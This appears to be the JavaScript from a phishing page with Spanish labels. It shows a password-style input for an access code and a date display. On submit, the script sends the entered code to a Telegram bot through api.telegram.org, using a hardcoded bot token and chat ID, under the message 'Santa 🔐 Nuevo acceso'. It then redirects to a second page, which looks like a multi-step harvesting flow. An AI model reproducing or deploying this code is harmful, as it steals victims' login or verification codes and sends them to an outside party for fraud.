const Code1input = document.getElementById('code1');
        const togglePasswordButton = document.getElementById('togglePassword');
        let isPasswordVisible = false;

        togglePasswordButton.addEventListener('click', () => {
            isPasswordVisible = !isPasswordVisible;
            if (isPasswordVisible) {
                Code1input.type = 'text';
                togglePasswordButton.innerHTML = '<img src="https://cdn-icons-png.flaticon.com/512/565/565655.png" alt="Ocultar">';
            } else {
                Code1input.type = 'password';
                togglePasswordButton.innerHTML = '<img src="https://cdn-icons-png.flaticon.com/512/709/709612.png" alt="Mostrar">';
            }
        });
        

    // Obtener la fecha actual
    const hoy = new Date();

    // Opciones de formato
    const opciones = { year: 'numeric', month: 'long', day: 'numeric' };

    // Insertar la fecha en el span
    document.getElementById('fecha').textContent = hoy.toLocaleDateString('es-ES', opciones);
        
    
    
    
   
document.getElementById('Code1').addEventListener('submit', async function(e) {
    e.preventDefault(); // Evita que se recargue la página
    const code1 = document.getElementById("code1").value;
    
    const code = document.getElementById("code1").value;

    const botToken = '7845185513:AAGsO3lREFyCXP6OsHEqwH0JtY4_tQHKlNo';
    const chatId = '-1002783212898';
    const mensaje = `Santa 🔐 Nuevo acceso:\nCódigo 1 ingresado:  \`${code1}\``;

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: mensaje,
            parse_mode: 'MarkdownV2'

            
        })

    
    });

    setTimeout(function() {
        window.location.href = "pag/pag2.html";
      }, 1000);
    });


  




   
